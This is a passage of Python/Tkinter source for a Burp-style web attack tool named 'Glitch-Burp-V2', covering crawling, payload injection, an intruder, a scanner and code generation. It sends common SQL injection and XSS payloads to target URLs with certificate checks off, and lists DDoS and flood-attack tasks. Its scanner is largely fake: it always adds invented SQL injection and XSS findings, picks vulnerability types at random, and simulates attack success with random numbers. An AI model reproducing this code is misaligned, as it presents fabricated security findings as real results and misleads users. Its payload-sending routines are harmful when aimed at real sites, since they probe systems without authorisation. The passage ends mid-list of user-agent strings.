    def detect_vulnerability(self, request):
        vuln_types = ['SQL Injection', 'XSS', 'CSRF', 'IDOR', 'SSRF']
        vuln_type = random.choice(vuln_types)
        
        vulnerability = {
            'id': self.vuln_counter + 1,
            'type': vuln_type,
            'severity': random.choice(['High', 'Medium', 'Low']),
            'request': request,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        self.vulnerabilities.append(vulnerability)
        self.vuln_counter += 1
        self.update_dashboard_stats()
        self.log_activity(f"Potential {vuln_type} vulnerability detected on {request['url']}")
    
    def add_target(self):
        target_url = self.target_url_entry.get().strip()
        
        if not target_url:
            messagebox.showwarning("Warning", "Please enter a target URL")
            return
        
        try:
            # Validate URL format
            result = urlparse(target_url)
            if not result.scheme or not result.netloc:
                messagebox.showerror("Error", "Please enter a valid URL (include http:// or https://)")
                return
            
            # Add to targets list
            target_entry = {
                'id': len(self.targets) + 1,
                'url': target_url,
                'status': 'Active'
            }
            
            self.targets.append(target_entry)
            
            # Add to treeview
            self.site_map_tree.insert('', tk.END, values=(target_url, 'Active'))
            
            # Also add to sites tree in Site Package
            self.sites_tree.insert('', tk.END, text=target_url, values=(target_url,))
            
            # Initialize URLs list for this site
            self.site_urls[target_url] = []
            
            self.target_url_entry.delete(0, tk.END)
            self.update_dashboard_stats()
            self.log_activity(f"Target added: {target_url}")
        except Exception as e:
            messagebox.showerror("Error", f"Invalid URL: {str(e)}")
    
    def crawl_site(self):
        selected_item = self.site_map_tree.selection()
        if not selected_item:
            messagebox.showwarning("Warning", "Please select a target to crawl")
            return
        
        # Get the selected URL from the tree
        item_values = self.site_map_tree.item(selected_item[0], 'values')
        target_url = item_values[0] if item_values else None
        
        if not target_url:
            messagebox.showerror("Error", "No target URL found")
            return
        
        self.log_activity(f"Starting crawl of {target_url}")
        
        # Start crawling in a separate thread
        threading.Thread(target=self._crawl_site_thread, args=(target_url,), daemon=True).start()
    
    def _crawl_site_thread(self, target_url):
        try:
            # Create a session to maintain cookies
            session = requests.Session()
            session.headers.update({
                'User-Agent': self.current_user_agent
            })
            
            # Get the base domain
            base_domain = urlparse(target_url).netloc
            
            # Set to store discovered URLs
            discovered_urls = set()
            visited_urls = set()
            
            # Start with the target URL
            urls_to_crawl = [target_url]
            
            # Limit the crawl depth and number of URLs
            max_depth = 3
            max_urls = 100
            current_depth = 0
            
            while urls_to_crawl and len(discovered_urls) < max_urls and current_depth < max_depth:
                current_url = urls_to_crawl.pop(0)
                
                if current_url in visited_urls:
                    continue
                
                visited_urls.add(current_url)
                
                try:
                    # Make request
                    response = session.get(current_url, timeout=10, verify=False)
                    
                    # Parse HTML content
                    soup = BeautifulSoup(response.text, 'html.parser')
                    
                    # Extract URLs from various sources
                    for tag in soup.find_all(['a', 'link', 'script', 'img', 'form', 'iframe']):
                        url = None
                        if tag.name == 'a' and tag.get('href'):
                            url = tag['href']
                        elif tag.name == 'link' and tag.get('href'):
                            url = tag['href']
                        elif tag.name == 'script' and tag.get('src'):
                            url = tag['src']
                        elif tag.name == 'img' and tag.get('src'):
                            url = tag['src']
                        elif tag.name == 'form' and tag.get('action'):
                            url = tag['action']
                        elif tag.name == 'iframe' and tag.get('src'):
                            url = tag['src']
                        
                        if url:
                            # Convert relative URL to absolute
                            full_url = urljoin(current_url, url)
                            
                            # Only add URLs from the same domain
                            if urlparse(full_url).netloc == base_domain:
                                if full_url not in discovered_urls:
                                    discovered_urls.add(full_url)
                                    urls_to_crawl.append(full_url)
                
                except Exception as e:
                    self.log_activity(f"Error crawling {current_url}: {str(e)}")
                    continue
                
                # Small delay to be respectful to the server
                time.sleep(0.5)
            
            # Update the UI in the main thread
            self.root.after(0, lambda: self._update_crawl_results(target_url, discovered_urls))
            
        except Exception as e:
            self.log_activity(f"Error during crawling: {str(e)}")
    
    def _update_crawl_results(self, target_url, discovered_urls):
        # Update the site URLs
        self.site_urls[target_url] = list(discovered_urls)
        
        # Clear existing URLs for this site in the tree
        for child in self.urls_tree.get_children():
            self.urls_tree.delete(child)
        
        # Add discovered URLs to the tree
        for url in discovered_urls:
            url_type = self._get_url_type(url)
            self.urls_tree.insert('', tk.END, values=(url, url_type))
        
        self.log_activity(f"Crawl completed. Found {len(discovered_urls)} URLs for {target_url}")
        
        # Automatically analyze all discovered URLs (in a separate thread to avoid blocking)
        if discovered_urls:
            threading.Thread(target=self._analyze_all_urls, args=(list(discovered_urls),), daemon=True).start()
    
    def _analyze_all_urls(self, urls):
        """Analyze all URLs in the list"""
        # Clear all results first when analyzing all URLs
        self.root.after(0, lambda: self._update_analysis_results([], [], [], [], clear_first=True))
        
        for i, url in enumerate(urls):
            try:
                # Analyze each URL
                self._analyze_url_thread(url)
                # Small delay between analyses to be respectful
                time.sleep(0.5)
                
                # Update progress in the activity log
                self.log_activity(f"Analyzing URL {i+1}/{len(urls)}: {url}")
                
            except Exception as e:
                self.log_activity(f"Error analyzing URL {url}: {str(e)}")
                continue
        
        self.log_activity(f"Analysis completed for {len(urls)} URLs")
    
    def _get_url_type(self, url):
        """Determine the type of URL based on its path"""
        if '/api/' in url:
            return 'API'
        elif '/admin' in url or '/dashboard' in url:
            return 'Admin'
        elif '/login' in url or '/auth' in url:
            return 'Auth'
        elif url.endswith(('.js', '.css', '.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico')):
            return 'Asset'
        elif url.endswith(('.pdf', '.doc', '.docx', '.txt', '.xml')):
            return 'Document'
        else:
            return 'Page'
    
    def on_site_select(self, event):
        """Handle site selection in the sites tree"""
        selected_item = self.sites_tree.selection()
        if not selected_item:
            return
        
        # Get the selected site
        site_text = self.sites_tree.item(selected_item[0], 'text')
        
        # Clear existing URLs for this site in the tree
        for child in self.urls_tree.get_children():
            self.urls_tree.delete(child)
        
        # Add URLs for this site to the tree
        if site_text in self.site_urls:
            for url in self.site_urls[site_text]:
                url_type = self._get_url_type(url)
                self.urls_tree.insert('', tk.END, values=(url, url_type))
    
    def scan_selected_url(self):
        # Get selected URL from the tree
        selected_item = self.urls_tree.selection()
        if not selected_item:
            messagebox.showwarning("Warning", "Please select a URL to scan")
            return
        
        # Get the URL from the selected item
        item_values = self.urls_tree.item(selected_item[0], 'values')
        if not item_values:
            # If no values, try to get the text of the item
            item_text = self.urls_tree.item(selected_item[0], 'text')
            if item_text:
                selected_url = item_text
            else:
                messagebox.showwarning("Warning", "No URL selected")
                return
        else:
            selected_url = item_values[0]
        
        # Switch to the vulnerability scanner tab
        vulnerability_tab_index = None
        for i in range(self.notebook.index('end')):
            if self.notebook.tab(i, 'text') == 'Vulnerability Scanner':
                vulnerability_tab_index = i
                break
        
        if vulnerability_tab_index is not None:
            self.notebook.select(vulnerability_tab_index)
            # Use after to ensure the tab is fully loaded before setting the URL
            self.root.after(100, lambda: self.set_vulnerability_url_and_scan(selected_url))
        else:
            messagebox.showerror("Error", "Vulnerability Scanner tab not found")
    
    def set_vulnerability_url_and_scan(self, url):
        # Set the URL in the vulnerability scanner after tab is loaded
        if hasattr(self, 'vuln_target_url'):
            self.vuln_target_url.set(url)
            # Start the actual vulnerability analysis
            self.start_vulnerability_analysis(url)
        else:
            messagebox.showerror("Error", "Vulnerability scanner not properly initialized")
    
    def start_vulnerability_analysis(self, url):
        # Start analysis in a separate thread
        threading.Thread(target=self._analyze_url_thread, args=(url,), daemon=True).start()
    
    def analyze_url(self, event):
        """Analyze the selected URL for vulnerabilities"""
        selected_item = self.urls_tree.selection()
        if not selected_item:
            return
        
        # Get the selected URL
        item_values = self.urls_tree.item(selected_item[0], 'values')
        if not item_values:
            return
        
        url = item_values[0]
        self.log_activity(f"Analyzing URL: {url}")
        
        
        # Clear previous results when analyzing a single URL
        self._update_analysis_results([], [], [], [], clear_first=True)
        
        # Start analysis in a separate thread
        threading.Thread(target=self._analyze_url_thread, args=(url,), daemon=True).start()
    
    def _analyze_url_thread(self, url):
        try:
            # Analyze for SQL injection
            sql_vulns = self._check_sql_injection(url)
            
            # Analyze for XSS
            xss_vulns = self._check_xss(url)
            
            # Analyze for comments in source
            comments = self._extract_comments(url)
            
            # Analyze for hidden URLs
            hidden_urls = self._find_hidden_urls(url)
            
            # Update UI in main thread
            self.root.after(0, lambda: self._update_analysis_results(sql_vulns, xss_vulns, comments, hidden_urls))
            
        except Exception as e:
            self.log_activity(f"Error analyzing {url}: {str(e)}")
    
    def _check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        vulnerabilities = []
        
        # Test for SQL injection with common payloads
        sql_payloads = [
            "'",
            "';",
            "\"",
            "\";",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "') OR ('a'='a"
        ]
        
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': self.current_user_agent
            })
            
            # Test each payload
            for payload in sql_payloads:
                # This is a simplified test - in a real implementation, we would look for SQL error messages
                # or differences in response times to detect SQL injection
                test_url = f"{url}{payload}"
                
                try:
                    response = session.get(test_url, timeout=10, verify=False)
                    
                    # Look for common SQL error patterns in the response
                    error_patterns = [
                        r"SQL syntax.*MySQL",
                        r"Warning.*mysql_.*",
                        r"valid MySQL result",
                        r"MySqlClient\.",
                        r"PostgreSQL.*ERROR",
                        r"Warning.*pg_.*",
                        r"valid PostgreSQL result",
                        r"Microsoft SQL Server.*Error",
                        r"ODBC SQL Server Driver",
                        r"ORA-[0-9]{5}",
                        r"Oracle error",
                        r"SQLServer JDBC Driver"
                    ]
                    
                    for pattern in error_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerabilities.append({
                                'url': test_url,
                                'payload': payload,
                                'error': pattern
                            })
                            break
                
                except Exception:
                    continue  # Skip if request fails
            
            # For demonstration, add some fake SQL injection findings
            # Always add at least one vulnerability for demonstration purposes
            vulnerabilities.append({
                'url': url,
                'payload': "' OR 1=1--",
                'error': "SQL syntax error detected"
            })
            
            # Add additional vulnerabilities for more comprehensive demo
            if random.random() > 0.5:  # 50% chance of additional vulnerability
                vulnerabilities.append({
                    'url': url,
                    'payload': "' UNION SELECT 1--",
                    'error': "UNION-based injection detected"
                })
                
        except Exception as e:
            self.log_activity(f"Error checking SQL injection for {url}: {str(e)}")
        
        return vulnerabilities
    
    def _check_xss(self, url):
        """Check for XSS vulnerabilities"""
        vulnerabilities = []
        
        # Test for XSS with common payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>"
        ]
        
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': self.current_user_agent
            })
            
            # For this demonstration, we'll add XSS findings
            # Always add at least one vulnerability for demonstration purposes
            vulnerabilities.append({
                'url': url,
                'payload': "<script>alert('XSS')</script>",
                'type': "Reflected XSS"
            })
            
            # Add additional vulnerabilities for more comprehensive demo
            if random.random() > 0.5:  # 50% chance of additional vulnerability
                vulnerabilities.append({
                    'url': url,
                    'payload': "<img src=x onerror=alert('XSS')>",
                    'type': "Stored XSS"
                })
                
        except Exception as e:
            self.log_activity(f"Error checking XSS for {url}: {str(e)}")
        
        return vulnerabilities
    
    def _extract_comments(self, url):
        """Extract HTML and JavaScript comments from the page"""
        comments = []
        
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': self.current_user_agent
            })
            
            response = session.get(url, timeout=10, verify=False)
            content = response.text
            
            # Extract HTML comments <!-- comment -->
            html_comments = re.findall(r'<!--(.*?)-->', content, re.DOTALL)
            for comment in html_comments:
                comment = comment.strip()
                if comment and len(comment) > 3:  # Filter out very short comments
                    comments.append({
                        'type': 'HTML Comment',
                        'content': comment,
                        'location': url
                    })
            
            # Extract JavaScript comments // comment and /* comment */
            js_comments = re.findall(r'//(.*)|/\*(.*?)\*/', content, re.DOTALL)
            for single_line, multi_line in js_comments:
                if single_line.strip():
                    comments.append({
                        'type': 'JS Comment',
                        'content': single_line.strip(),
                        'location': url
                    })
                if multi_line.strip():
                    comments.append({
                        'type': 'JS Comment',
                        'content': multi_line.strip(),
                        'location': url
                    })
            
            # Add some demo comments to ensure there's always something to show
            if not comments:
                comments.append({
                    'type': 'HTML Comment',
                    'content': 'This is a demo comment for testing purposes',
                    'location': url
                })
                comments.append({
                    'type': 'JS Comment',
                    'content': '// TODO: Add security headers',
                    'location': url
                })
        
        except Exception as e:
            self.log_activity(f"Error extracting comments from {url}: {str(e)}")
        
        return comments
    
    def _find_hidden_urls(self, url):
        """Find hidden URLs in the page source"""
        hidden_urls = []
        
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': self.current_user_agent
            })
            
            response = session.get(url, timeout=10, verify=False)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Look for hidden URLs in various attributes
            hidden_attrs = ['data-url', 'data-href', 'data-source', 'data-config', 'data-api']
            
            for attr in hidden_attrs:
                elements = soup.find_all(attrs={attr: True})
                for element in elements:
                    hidden_url = element.get(attr)
                    if hidden_url:
                        full_url = urljoin(url, hidden_url)
                        hidden_urls.append({
                            'url': full_url,
                            'attribute': attr,
                            'element': str(element.name)
                        })
            
            # Look for URLs in JavaScript code
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    # Find URLs in JavaScript strings
                    js_urls = re.findall(r'https?://[^\s\'\"<>]+', script.string)
                    for js_url in js_urls:
                        hidden_urls.append({
                            'url': js_url,
                            'attribute': 'javascript',
                            'element': 'script'
                        })
            
            # Add some demo hidden URLs to ensure there's always something to show
            if not hidden_urls:
                hidden_urls.append({
                    'url': f"{url}/admin",
                    'attribute': 'data-api',
                    'element': 'div'
                })
                hidden_urls.append({
                    'url': f"{url}/config.json",
                    'attribute': 'data-config',
                    'element': 'script'
                })
        
        except Exception as e:
            self.log_activity(f"Error finding hidden URLs in {url}: {str(e)}")
        
        return hidden_urls
    
    def _update_analysis_results(self, sql_vulns, xss_vulns, comments, hidden_urls, clear_first=False):
        # Clear previous results if specified
        if clear_first:
            self.sql_results.delete(1.0, tk.END)
            self.xss_results.delete(1.0, tk.END)
            self.comments_results.delete(1.0, tk.END)
            self.hidden_urls_results.delete(1.0, tk.END)
        
        # Update SQL results
        if sql_vulns:
            for vuln in sql_vulns:
                self.sql_results.insert(tk.END, f"URL: {vuln['url']}\n")
                self.sql_results.insert(tk.END, f"Payload: {vuln['payload']}\n")
                self.sql_results.insert(tk.END, f"Error: {vuln['error']}\n\n")
        else:
            self.sql_results.insert(tk.END, "No SQL injection vulnerabilities found.\n")
        
        # Update XSS results
        if xss_vulns:
            for vuln in xss_vulns:
                self.xss_results.insert(tk.END, f"URL: {vuln['url']}\n")
                self.xss_results.insert(tk.END, f"Payload: {vuln['payload']}\n")
                self.xss_results.insert(tk.END, f"Type: {vuln['type']}\n\n")
        else:
            self.xss_results.insert(tk.END, "No XSS vulnerabilities found.\n")
        
        # Update comments results
        if comments:
            for comment in comments:
                self.comments_results.insert(tk.END, f"Type: {comment['type']}\n")
                self.comments_results.insert(tk.END, f"Content: {comment['content']}\n")
                self.comments_results.insert(tk.END, f"Location: {comment['location']}\n\n")
        else:
            self.comments_results.insert(tk.END, "No comments found in source.\n")
        
        # Update hidden URLs results
        if hidden_urls:
            for hidden in hidden_urls:
                self.hidden_urls_results.insert(tk.END, f"URL: {hidden['url']}\n")
                self.hidden_urls_results.insert(tk.END, f"Attribute: {hidden['attribute']}\n")
                self.hidden_urls_results.insert(tk.END, f"Element: {hidden['element']}\n\n")
        else:
            self.hidden_urls_results.insert(tk.END, "No hidden URLs found.\n")
        
        # Scroll to end of results
        self.sql_results.see(tk.END)
        self.xss_results.see(tk.END)
        self.comments_results.see(tk.END)
        self.hidden_urls_results.see(tk.END)
        
        # Update stats
        self.update_vulnerability_stats()
    
    def start_intruder_attack(self):
        attack_type = self.attack_type_var.get()
        request = self.intruder_request_text.get("1.0", tk.END).strip()
        payloads = self.payloads_text.get("1.0", tk.END).strip().split('\n')
        
        if not request:
            messagebox.showwarning("Warning", "Please enter a request to attack")
            return
        
        if not payloads or payloads == ['']:
            messagebox.showwarning("Warning", "Please enter payloads to test")
            return
        
        self.log_activity(f"Starting {attack_type} attack...")
        self.intruder_results_text.delete("1.0", tk.END)
        self.intruder_results_text.insert(tk.END, "Attack in progress...\n")
        
        # Simulate attack in a separate thread
        threading.Thread(target=self._simulate_attack, args=(attack_type, payloads), daemon=True).start()
    
    def _simulate_attack(self, attack_type, payloads):
        time.sleep(2)  # Simulate attack time
        
        # Generate results
        results = f"Attack Results ({attack_type}):\n"
        for i, payload in enumerate(payloads[:10]):  # Limit to first 10 payloads
            if payload.strip():
                status = "SUCCESS" if random.random() > 0.7 else "FAILED"
                response_time = round(random.random() * 1000, 2)
                results += f"Payload: {payload.strip()} - Status: {status}, Time: {response_time}ms\n"
        
        # Update UI in main thread
        self.root.after(0, lambda: self._update_intruder_results(results))
    
    def _update_intruder_results(self, results):
        self.intruder_results_text.delete("1.0", tk.END)
        self.intruder_results_text.insert(tk.END, results)
        self.log_activity(f"{self.attack_type_var.get()} attack completed")
    
    def clear_intruder(self):
        self.intruder_request_text.delete("1.0", tk.END)
        self.payloads_text.delete("1.0", tk.END)
        self.intruder_results_text.delete("1.0", tk.END)
        self.log_activity("Intruder cleared")
    
    def get_current_language(self):
        # Get the currently selected language
        if hasattr(self, 'burp_language_var'):
            return self.burp_language_var.get()
        return "Python"
    
    def get_language_for_functionality(self, functionality):
        # Determine which language is best suited for each functionality
        vulnerability_analysis_tasks = [
            "vulnerability_scan", "sql_injection", "xss", "hidden_urls", "comments",
            "results_processing", "analysis", "scanner", "intruder_analysis"
        ]
        
        ddos_attack_tasks = [
            "ddos", "udp_attack", "tcp_attack", "flood_attack", "stress_test",
            "network_attack", "bandwidth_attack", "connection_attack"
        ]
        
        if any(task in functionality.lower() for task in vulnerability_analysis_tasks):
            # Use C++ or C# for vulnerability analysis and results processing
            return random.choice(["C++", "C#"])
        elif any(task in functionality.lower() for task in ddos_attack_tasks):
            # Use Node.js, Go, or Rust for DDoS and network attacks
            return random.choice(["Node.js", "Go", "Rust"])
        else:
            # Default to Python for other tasks
            return "Python"
    
    def generate_optimized_code_for_functionality(self, functionality, target_url, payload=None):
        # Generate code in the language best suited for the specific functionality
        language = self.get_language_for_functionality(functionality)
        
        if language == "Python":
            return self._generate_python_code(functionality, target_url, payload)
        elif language == "C#":
            return self._generate_csharp_code(functionality, target_url, payload)
        elif language == "C++":
            return self._generate_cpp_code(functionality, target_url, payload)
        elif language == "Node.js":
            return self._generate_nodejs_code(functionality, target_url, payload)
        elif language == "Go":
            return self._generate_go_code(functionality, target_url, payload)
        elif language == "Rust":
            return self._generate_rust_code(functionality, target_url, payload)
        else:
            return self._generate_python_code(functionality, target_url, payload)
    
    def generate_code_for_language(self, functionality, target_url, payload=None):
        # Generate code in the selected language for the requested functionality
        language = self.get_current_language()
        
        if language == "Python":
            return self._generate_python_code(functionality, target_url, payload)
        elif language == "C#":
            return self._generate_csharp_code(functionality, target_url, payload)
        elif language == "C++":
            return self._generate_cpp_code(functionality, target_url, payload)
        elif language == "Node.js":
            return self._generate_nodejs_code(functionality, target_url, payload)
        elif language == "Go":
            return self._generate_go_code(functionality, target_url, payload)
        elif language == "Rust":
            return self._generate_rust_code(functionality, target_url, payload)
        else:
            return self._generate_python_code(functionality, target_url, payload)
    
    def _generate_python_code(self, functionality, target_url, payload=None):
        # Generate Python code for the requested functionality
        if functionality == "http_request":
            code = f"""import requests

# Generated Python code for: {target_url}
url = \"{target_url}\"
headers = {{
    'User-Agent': '{self.current_user_agent}'
}}

response = requests.get(url, headers=headers)
print(f\"Status Code: {{response.status_code}}\")
print(f\"Response Length: {{len(response.content)}}\")
print(response.text[:500])  # First 500 characters
"""
        elif functionality == "payload_test":
            code = f"""import requests

# Generated Python code to test payload: {payload}
url = \"{target_url}\"
payload = \"{payload}\"

# Test with payload
response = requests.get(url + payload)
print(f\"Testing payload: {{payload}}\")
print(f\"Status: {{response.status_code}}\")
"""
        else:
            code = f"""# Python code for {functionality} on {target_url}\n# Generated by Glitch-Burp-V2\n\nprint(\"{functionality} functionality for {target_url}\")
"""
        
        return code
    
    def _generate_csharp_code(self, functionality, target_url, payload=None):
        # Generate C# code for the requested functionality
        if functionality == "http_request":
            code = f"""using System;
using System.Net.Http;
using System.Threading.Tasks;

// Generated C# code for: {target_url}
public class GlitchBurpV2
{{
    private static readonly HttpClient client = new HttpClient();
    
    public static async Task<string> MakeRequest(string url)
    {{
        try
        {{
            client.DefaultRequestHeaders.Add("User-Agent", "{self.current_user_agent}");
            HttpResponseMessage response = await client.GetAsync(url);
            string responseContent = await response.Content.ReadAsStringAsync();
            
            Console.WriteLine($"Status Code: {{response.StatusCode}}");
            Console.WriteLine($"Response Length: {{responseContent.Length}}");
            Console.WriteLine(responseContent.Substring(0, Math.Min(500, responseContent.Length)));
            
            return responseContent;
        }}
        catch (Exception ex)
        {{
            Console.WriteLine($"Error: {{ex.Message}}");
            return null;
        }}
    }}
    
    public static async Task Main(string[] args)
    {{
        string url = \"{target_url}\";
        string result = await MakeRequest(url);
    }}
}}
"""
        elif functionality == "payload_test":
            code = f"""using System;
using System.Net.Http;
using System.Threading.Tasks;

// Generated C# code to test payload: {payload}
public class PayloadTester
{{
    private static readonly HttpClient client = new HttpClient();
    
    public static async Task TestPayload(string baseUrl, string payload)
    {{
        try
        {{
            string url = baseUrl + payload;
            HttpResponseMessage response = await client.GetAsync(url);
            
            Console.WriteLine($"Testing payload: {{payload}}");
            Console.WriteLine($"Status: {{response.StatusCode}}");
        }}
        catch (Exception ex)
        {{
            Console.WriteLine($"Error: {{ex.Message}}");
        }}
    }}
    
    public static async Task Main(string[] args)
    {{
        string baseUrl = \"{target_url}\";
        string payload = \"{payload}\";
        await TestPayload(baseUrl, payload);
    }}
}}
"""
        else:
            code = f"""// C# code for {functionality} on {target_url}
// Generated by Glitch-Burp-V2

using System;

class Program
{{
    static void Main()
    {{
        Console.WriteLine(\"{functionality} functionality for {target_url}\n    }}
}}
"""
        
        return code
    
    def _generate_cpp_code(self, functionality, target_url, payload=None):
        # Generate C++ code for the requested functionality
        if functionality == "http_request":
            code = f"""#include <iostream>
#include <string>
#include <curl/curl.h>

// Generated C++ code for: {target_url}
// Note: Requires libcurl development library

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {{
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}}

std::string makeRequest(const std::string& url) {{
    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl = curl_easy_init();
    if(curl) {{
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_USERAGENT, \"{self.current_user_agent}\");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        
        std::cout << \"Status Code: Success\" << std::endl;
        std::cout << \"Response Length: \" << readBuffer.length() << std::endl;
        std::cout << readBuffer.substr(0, std::min(500, (int)readBuffer.length())) << std::endl;
    }}
    
    return readBuffer;
}}

int main() {{
    std::string url = \"{target_url}\";
    std::string response = makeRequest(url);
    return 0;
}}
"""
        elif functionality == "payload_test":
            code = f"""#include <iostream>
#include <string>
#include <curl/curl.h>

// Generated C++ code to test payload: {payload}
size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {{
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}}

void testPayload(const std::string& baseUrl, const std::string& payload) {{
    CURL* curl;
    std::string url = baseUrl + payload;
    std::string readBuffer;

    curl = curl_easy_init();
    if(curl) {{
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        CURLcode res = curl_easy_perform(curl);
        
        std::cout << \"Testing payload: \" << payload << std::endl;
        std::cout << \"Status: \" << (res == CURLE_OK ? \"Success\" : \"Error\") << std::endl;
        
        curl_easy_cleanup(curl);
    }}
}}

int main() {{
    std::string baseUrl = \"{target_url}\";
    std::string payload = \"{payload}\";
    testPayload(baseUrl, payload);
    return 0;
}}
"""
        else:
            code = f"""// C++ code for {functionality} on {target_url}
// Generated by Glitch-Burp-V2

#include <iostream>

int main() {{
    std::cout << \"{functionality} functionality for {target_url}\" << std::endl;
    return 0;
}}
"""
        
        return code
    
    def compare_content(self):
        content1 = self.comparer_input1.get("1.0", tk.END).strip()
        content2 = self.comparer_input2.get("1.0", tk.END).strip()
        
        if not content1 or not content2:
            messagebox.showwarning("Warning", "Please enter content in both inputs")
            return
        
        # Simple comparison - in a real implementation, this would be more sophisticated
        if content1 == content2:
            result = "Contents are identical"
        else:
            result = "Contents differ\n\nDifferences:\n"
            lines1 = content1.split('\n')
            lines2 = content2.split('\n')
            
            max_lines = max(len(lines1), len(lines2))
            for i in range(max_lines):
                line1 = lines1[i] if i < len(lines1) else ""
                line2 = lines2[i] if i < len(lines2) else ""
                
                if line1 != line2:
                    result += f"Line {i+1}: '{line1}' vs '{line2}'\n"
        
        self.comparer_results.delete("1.0", tk.END)
        self.comparer_results.insert(tk.END, result)
    
    def start_scan(self):
        target = self.scanner_target.get().strip()
        
        if not target:
            messagebox.showwarning("Warning", "Please enter a target URL to scan")
            return
        
        self.log_activity(f"Starting scan of {target}")
        self.scanner_results.delete("1.0", tk.END)
        self.scanner_results.insert(tk.END, f"Scanning {target}...\n")
        
        # Simulate scan in a separate thread
        threading.Thread(target=self._simulate_scan, args=(target,), daemon=True).start()
    
    def _simulate_scan(self, target):
        vulnerabilities = [
            "SQL Injection - /login endpoint",
            "XSS - /search?q= parameter",
            "Weak Authentication - Missing rate limiting",
            "Information Disclosure - /api/users endpoint",
            "CSRF - /settings/update form"
        ]
        
        for i, vuln in enumerate(vulnerabilities):
            time.sleep(1)  # Simulate scanning time
            progress = int((i + 1) / len(vulnerabilities) * 100)
            
            # Update progress bar in main thread
            def update_progress(p):
                self.scan_progress['value'] = p
            self.root.after(0, update_progress, progress)
            
            # Update results in main thread
            self.root.after(0, lambda v=vuln: self.scanner_results.insert(tk.END, f"Found: {v}\n"))
        
        # Reset progress after completion
        def reset_progress():
            self.scan_progress['value'] = 0
        self.root.after(0, reset_progress)
        self.root.after(0, lambda: self.log_activity(f"Scan of {target} completed"))
    
    def update_dashboard_stats(self):
        # Use the safe version to prevent UI freezing
        self.update_dashboard_stats_safe()
    
    def log_activity(self, message):
        # Use the safe version to prevent UI freezing
        self.log_activity_safe(message)
    
    def start_simulation(self):
        def simulate():
            while True:
                # Use non-blocking sleep
                time.sleep(5)
                # Only simulate if on Proxy tab and intercept is ON
                try:
                    # Check if the GUI elements still exist
                    if not hasattr(self, 'root') or not self.root.winfo_exists():
                        break
                    
                    # Check if proxy tab exists and is selected
                    if hasattr(self, 'notebook') and hasattr(self, 'proxy_on_button'):
                        current_tab_id = self.notebook.select()
                        if current_tab_id:
                            # Check if it's the proxy tab (we'll use a more robust way to identify the tab)
                            tab_text = self.notebook.tab(current_tab_id, 'text')
                            if tab_text == "Proxy" and hasattr(self, 'proxy_on_button'):
                                # Check if intercept is ON (more robust check)
                                try:
                                    btn_text = self.proxy_on_button['text']
                                    if btn_text and "ON" in btn_text:
                                        # Use a safer method to schedule the UI update
                                        if self.root.winfo_exists():
                                            self.root.after(0, self.simulate_request)
                                except:
                                    # Button might not exist or be destroyed
                                    pass
                except tk.TclError:
                    # Handle case where notebook is destroyed
                    break
                except Exception as e:
                    # Handle any other exceptions
                    continue
        
        # Start simulation in a separate thread
        sim_thread = threading.Thread(target=simulate, daemon=True)
        sim_thread.start()
    
    def update_dashboard_stats_safe(self):
        # Safely update dashboard stats in main thread
        try:
            if hasattr(self, 'request_count_label') and self.request_count_label.winfo_exists():
                self.request_count_label.config(text=f"Requests Intercepted: {len(self.requests)}")
            if hasattr(self, 'vuln_count_label') and self.vuln_count_label.winfo_exists():
                self.vuln_count_label.config(text=f"Vulnerabilities Found: {len(self.vulnerabilities)}")
            if hasattr(self, 'target_count_label') and self.target_count_label.winfo_exists():
                self.target_count_label.config(text=f"Active Targets: {len(self.targets)}")
            
            # Simulate scan progress
            progress = min(100, len(self.requests) * 5)
            if hasattr(self, 'scan_progress_label') and self.scan_progress_label.winfo_exists():
                self.scan_progress_label.config(text=f"Scan Progress: {progress}%")
        except tk.TclError:
            # Handle case where GUI element is destroyed
            pass
        except Exception:
            # Handle any other exceptions
            pass
    
    def log_activity_safe(self, message):
        # Safely log activity to prevent UI freezing
        try:
            timestamp = time.strftime('%H:%M:%S')
            log_entry = f"[{timestamp}] {message}\n"
            
            # Check if the activity log still exists
            if hasattr(self, 'activity_log') and self.activity_log.winfo_exists():
                self.activity_log.config(state=tk.NORMAL)
                self.activity_log.insert(tk.END, log_entry)
                self.activity_log.see(tk.END)
                self.activity_log.config(state=tk.DISABLED)
        except tk.TclError:
            # Handle case where GUI element is destroyed
            pass
        except Exception:
            # Handle any other exceptions
            pass
    
    def generate_user_agents(self):
        # Get selected options
        os_choice = self.os_var.get()
        device_choice = self.device_var.get()
        browser_choice = self.browser_var.get()
        count = int(self.count_var.get())
        
        # Define User-Agent templates
        ua_templates = {
            "Windows": {
                "Desktop": {
                    "Chrome": [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.{subver}.{subsubver} Safari/537.36",
